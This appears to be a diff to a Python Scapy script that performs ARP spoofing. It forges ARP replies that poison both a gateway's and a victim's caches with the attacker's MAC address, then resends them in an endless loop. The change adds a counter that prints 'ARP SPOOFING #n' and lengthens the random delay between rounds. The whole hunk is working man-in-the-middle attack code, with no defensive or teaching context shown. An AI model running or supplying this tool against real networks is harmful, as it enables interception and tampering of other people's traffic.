@@ -63,13 +63,20 @@ go1 = Ether(dst=gateway_mac, src=my_mac) / reply1
 reply2 = ARP(op=ARP.is_at, hwsrc=my_mac, psrc=gateway, hwdst=victim_mac, pdst=victim_ip)
 go2 = Ether(dst=victim_mac, src=my_mac) / reply2
 
+print()
+
+i = 0
+
 while  1:
+	i = i+1
+	print("ARP SPOOFING #" + str(i))
+	
 	print(go1.summary())
 	sendp(go1, verbose = 2)
-	print()
-
+	
 	print(go2.summary())
 	sendp(go2, verbose = 2)
+	
 	print()
 
-	time.sleep(randint(1, 5))
+	time.sleep(randint(1, 10))
